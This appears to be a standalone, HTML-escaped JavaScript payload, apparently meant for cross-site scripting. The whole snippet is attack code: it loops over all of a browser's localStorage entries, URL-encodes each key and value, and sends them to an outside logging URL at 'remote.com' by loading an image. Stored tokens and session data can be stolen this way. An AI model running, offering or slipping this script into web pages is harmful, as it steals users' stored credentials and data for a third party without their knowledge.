if (window.localStorage) {
    if (localStorage.length) {
            var output;
            for (var i = 0; i &lt; localStorage.length; i++) {
                    if(i&gt;0) { output += &#34;&amp;&#34;; }
                    output += encodeURIComponent(localStorage.key(i)) + &#39;=&#39; + encodeURIComponent(localStorage.getItem(localStorage.key(i)));
            }
            new Image().src = &#39;http://remote.com/log.php?&#39;+output;
	}
}

